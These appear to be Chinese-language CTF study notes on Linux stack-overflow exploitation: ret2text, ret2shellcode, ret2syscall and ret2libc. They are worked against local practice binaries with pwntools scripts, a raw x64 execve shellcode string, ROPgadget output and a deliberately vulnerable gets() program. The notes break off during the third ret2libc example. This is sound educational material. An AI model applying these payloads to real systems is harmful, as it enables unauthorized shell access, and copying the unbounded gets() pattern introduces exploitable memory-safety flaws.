# 栈溢出

## [栈溢出原理](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow_basic/)

样例

```c
// stack_example.c
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

编译指令：

```bash
stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example
```

断点下在 `vulnerable()` 上，查看栈帧。

此时 `$esp` 的地址为 `0xffffce20` ，`$ebp` 的地址为 `0xffffce38` 。由于 `s` 的地址相对 `$esp` 的偏移为 `+4h` ，因此 `s` 的地址为 ` 0xffffce24` ，相对 `$ebp` 的偏移就是 `0x14` ，相对于返回地址的偏移为 `0x14+0x4=0x18` 。又知 `success()` 函数地址为`0x804843B` ，可以构造payload：

```python
from pwn import *
success_addr = 0x804843B
p = process('./stack_example')
payload = 'a'*(0x14+0x4)+p32(success_addr)
p.sendline(payload)
p.interactive()
```

就能成功执行了。

## [基本ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/)

ROP概念

### ret2text

简介：

控制程序执行程序本身已有的代码。

核心

确定我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。

样例

分析 ret2text：

checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

打开IDA分析

发现gets函数存在栈溢出的可能，在`secure()`函数中发现了`system("/bin/sh");`这一指令。

查看汇编指令及相应的内存地址，我们我们需要将返回值返回到这里就可以了。

将断点下在 `0x080486AE` 并进行调试。

此时 `$esp` 的值为 `0xffffcde0` ，`$ebp` 的值为 `0xffffce68 ` 。由IDA的反汇编知字符串 `s` 相对于 `$esp` 的偏移为 `0x1c` ，所以 `s` 的地址为 `0xffffcdfc` 。所以 `s` 相对 `$ebp` 的偏移为 `0x6c` ，相对于返回地址的偏移为`0x6c+4=0x70` 。则可以构造出 payload:

```python
import pwn
p = pwn.process('./ret2text')
sh_addr = 0x0804863A
p.sendline('a'*(0x6c+4)+pwn.p32(sh_addr))
p.interactive()
```

这样就可以拿到shell了。

### ret2shellcode

简介：

控制程序执行 shellcode代码

核心：

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。

样例

首先 `checksec`

```bash
[*] '/mnt/f/github/pwn-study/Linux-pwn/ret2shellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

没有任何保护，还有可执行可读可写段。

用IDA查看它的大概逻辑，将输入的字符串 `s` 拷贝到了位于 `.bss` 段的 `buf2` 处。其地址为 `0x804A080` 。

使用 `vmmap` 指令查看该 `bss` 段是否可执行。

具体操作如下：

使用 gdb 将断点下在 `main` 处，运行，输入命令 `vmmap` ，发现有如下输出：

```bash
0x08048000 0x08049000 r-xp	/home/qrz/Desktop/pwn-study/ret2shellcode
0x08049000 0x0804a000 r-xp	/home/qrz/Desktop/pwn-study/ret2shellcode
0x0804a000 0x0804b000 rwxp	/home/qrz/Desktop/pwn-study/ret2shellcode
0xf7dfb000 0xf7dfc000 rwxp	mapped
0xf7dfc000 0xf7fac000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 rwxp	/lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 rwxp	mapped
0xf7fd3000 0xf7fd4000 rwxp	mapped
0xf7fd4000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rwxp	/lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rwxp	[stack]
```

发现我们要用的那一段

```bash
0x0804a000 0x0804b000 rwxp	/home/qrz/Desktop/pwn-study/ret2shellcode
```

是可以执行的。

于是我们的思路是这样的：

输入 `shellcode` ，它会被拷贝到相应的 `.bss` 段，接下来我们通过ROP的方式使得返回地址指向该段的地址就可以了。

看看这时 `main` 函数的栈帧：

`$esp` =` 0xffffcdd0` ，`$ebp` = `0xffffce58` ，`s_addr` = `0xffffcdec` 

`s` 到栈底的距离为 `0xe58-0xdec=0x6c` 。

这时就可以构造 `payload` 了。

```python
# --*--coding:utf-8--*--
from pwn import *
p = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804A080
payload = shellcode.ljust((0x6c+4),'a')+p32(buf2_addr)
p.sendline(payload)
p.interactive()
```

这里用到了 pwntools 自带的 `shellcraft.sh()` 方法。其他的方法还需要相应的学习。

查看shellcode的网站：https://www.exploit-db.com/shellcode/

这里他布置了一道习题：sniperoj-pwn100-shellcode-x86-64 ，我们来看一下：

```bash
[*] '/mnt/f/github/pwn-study/Linux-pwn/shellcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

发现是64位的，接着看源代码：

中间有一处打印出来了 `buf` 的地址，可以使用之。

根据wp：

>通过
>
>```
>  __int64 buf; // [sp+0h] [bp-10h]@1
>  read(0, &buf, 0x40uLL);
>```
>
>可以知道buf相对于ebp的偏移为0x10,所以其可用的shellcode空间为16+8=24。我找了到了一个长度为23的shellcode。但是其本身是有push指令的，这时候如果我们把shellcode放在最前面，在程序leave的时候，在执行这些就会被覆盖。

不得不佩服一下，这个我真的没有想到。就是说`buf`后面 `0x10+0x8` 大小的空间都不可以使用，因为在那之前的 `leave` 指令会将这一段覆盖掉。既然这样，我们跳过这一段就可以了。

这时的payload就是：

```bash
'a'*(0x10+8)+(buf_addr+(0x10+8+8))+shellcode
```

这个payload的长度是55，小于 0x40 。我们还可以试试其他的shellcode。在这之前，我们把它转换成代码吧。

```python
# --*-- coding:utf-8 --*--
from pwn import *

p = process('./shellcode')

shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.recvuntil('[')
buf_addr = p.recvuntil(']', drop=True)
buf_addr = int(buf_addr, 16)

payload = 'a'*24+p64(buf_addr+32)+shellcode_x64
print(len(payload))
p.sendline(payload)
p.interactive()
```

### ret2syscall

原理

ret2syscall，即控制程序执行系统调用，获取 shell。

系统调用。。需要重温计组了。

```bash
[*] '/mnt/f/github/pwn-study/Linux-pwn/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

利用 `execve("/bin/sh",NULL,NULL)` 获取shell。

其中，系统调用号为 `0xb` ，第一个参数为 `/bin/sh` 的地址，第二、三个参数均为0。

我们用ROPgadgets以控制这些寄存器。

首先寻找控制 `$eax` 的 gadgets：

```bash
ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
```

得到：

```bash
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

wp选取第二个作为gadgets。

接下来寻找 `$ebx` 的gadgets：

```bash
ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
```

得到：

```bash
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

这里选取了

```
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

作为gadgets，因为它可以同时控制三个寄存器。

此外要获得 `/bin/sh` 的地址：

```bash
ROPgadget --binary rop  --string '/bin/sh'
```

得到：

```
Strings information
============================================================
0x080be408 : /bin/sh
```

接下来要找到 `int 0x80` 的地址：

```bash
ROPgadget --binary rop  --only 'int'
```

得到：

```
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```

接下来我们用gdb调试，查看main的栈帧。

此时 `esp = 0xffffce00` ，`ebp = 0xffffce88` ，`v4 = 0xffffce1c` ，要覆盖的栈的大小为 `0xce88-0xcd1c+0x4=0x70` 。

这样前期的准备就相应完成了。

接下来payload是什么形式的呢？

首先是覆盖到返回地址，接下来要调整参数。

对于 eax 而言，其值为 0xb，则压入地址再压参数；

对于ebx, ecx, edx而言，压入顺序为edx, ecx, ebx；因此按照相应顺序压入即可。

```
payload = 'a'*0x70 + 
```

查看wp，用了 pwntools 的 flat 特性。

构造payload如下：

```python

from pwn import *

eax_addr = 0x080bb196
edcbx_addr = 0x0806eb90
binsh_addr = 0x080be408
int80_addr = 0x08049421

payload = flat(['a'*0x70,eax_addr,0xb,edcbx_addr,0,0,binsh_addr,int80_addr])
p = process('./rop')
p.sendlineafter("What do you plan to do?\n", payload)
p.interactive()
```

### ret2libc

#### 例1

```bash
[*] '/mnt/f/github/pwn-study/Linux-pwn/ret2libc1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用IDA可以发现程序中存在 `system` 函数和 `/bin/sh` 字符串

```
➜  pwn-study ROPgadget --binary ret2libc1 --string '/bin/sh'
Strings information
============================================================
0x08048720 : /bin/sh
```

```c
.plt:08048460 ; int system(const char *command)
```

通过计算得到要覆盖的区域大小为 `0x70` ，然后压入 `system` 的地址，然后压入一个返回值，最后压入 `/bin/sh` 的地址。

这样子我们可以构造出相应的payload:

```
payload = 'a'*0x70+sys_addr+'a'*4+binsh_addr
```

参考代码如下：

```python
from pwn import *

p = process('./ret2libc1')

sys_addr = 0x08048460
binsh_addr = 0x08048720

payload = flat(['a'*0x70,sys_addr,'a'*4,binsh_addr])
p.sendline(payload)
p.interactive()
```

#### 例2

```bash
[*] '/mnt/f/github/pwn-study/Linux-pwn/ret2libc2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

能查到存在 `system` 函数

```c
.plt:08048490 ; int system(const char *command)
```

然而由于不存在 `/bin/sh` ，我们需要自己构造这样一个字符串。这样的话，我们需要两个 gadgets。

```c
.plt:08048460 ; char *gets(char *s)
```

另外，查看wp之后发现 bss 段中还有一个 `buf2` 字符串，我们可以将输入的 `/bin/sh` 存放到这里。

buf2 的地址：

```
.bss:0804A080 ; char buf2[100]
```

我们需要自行构造栈帧，第一次跳到gets函数的位置，第二次跳到system的位置。中间需要平衡栈帧，因此我们用 ` ROPgadgets` 选一个 `pop ebx` 。

执行：

```bash
ROPgadget --binary ret2libc2 --only 'pop|ret' | grep 'ebx'
```

返回：

```
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
```

我们选择第二个作为调栈的参数（一会可以试试`pop esi`）。在这些之前，不要忘了看一下要填充的空间大小。我计算得到的是0x70。IDA还是不如实际调试的准啊XD

这样就可以构造出payload了

```
payload='a'*0x70+gets_addr+pop_ebx+buf2+system_addr+0xdeadbeef+buf2
```

此时system还缺少参数，如果传入此payload的话可以执行代码，但是只能执行一次。在这之后我们还要再次传入`/bin/sh` 。

完整payload：

```python
from pwn import *

p = process('./ret2libc2')

gets_addr = 0x08048460
system_addr = 0x08048490
popebx_addr = 0x0804843d
buf2_addr = 0x0804A080

payload = flat([
    'a' * 0x70, gets_addr, popebx_addr, buf2_addr, system_addr, 0xdeadbeef,
    buf2_addr
])

p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
```

虽然ctf-wiki上说难度和第一个一样，但是我感觉又学到了很多东西呢。。

#### 例3

```bash
[*] '/mnt/f/github/pwn-study/Linux-pwn/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

这个难度明显更大了。。没有`system`没有`/bin/sh`。当然其漏洞的位置没有变化，始终是`gets()`函数溢出。

该怎么办呢？我们结题的方向始终不变：执行`system("/bin/sh")`，拿到shell。

在这之前，根据system函数的相对位置不变这一原则，我们首先泄露其他函数的地址，根据glibc的版本判断system函数的位置。本道题提供了 `libc.so` ，如果不提供的话需要使用相应的工具。有时间也要试一下。